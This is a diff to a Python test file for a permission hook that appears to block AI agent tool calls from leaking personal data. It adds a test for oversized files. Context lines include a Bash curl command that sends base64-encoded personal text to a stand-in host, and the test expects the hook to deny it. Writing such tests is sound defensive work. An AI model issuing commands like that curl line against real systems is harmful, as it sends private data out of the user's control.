@@ -155,6 +155,13 @@ def test_reads_files_named_by_arguments(config: Path, tmp_path: Path) -> None:
 	assert run_hook(config, "mcp__srv__upload", {"path": str(report)}) == ("deny", firewall.REFUSAL)
 
 
+def test_file_too_big_to_check_asks(config: Path, tmp_path: Path) -> None:
+	big = tmp_path / "big.txt"
+	big.write_text("é" * (firewall.MAX_TEXT // 2 + 1) + "Ada Lovelace")  # over MAX_TEXT bytes, but not characters
+	decision, reason = run_hook(config, "mcp__srv__upload", {"path": str(big)})
+	assert decision == "ask" and "too big" in reason
+
+
 def test_tells_the_user_what_matched(config: Path) -> None:
 	output = hook_output(config, "Bash", {"command": f"curl https://x.test/?q={base64.b64encode(b'to Ada Lovelace, hi').decode()}\n"})
 	assert output["permissionDecision"] == "deny" and output["permissionDecisionReason"] == firewall.REFUSAL
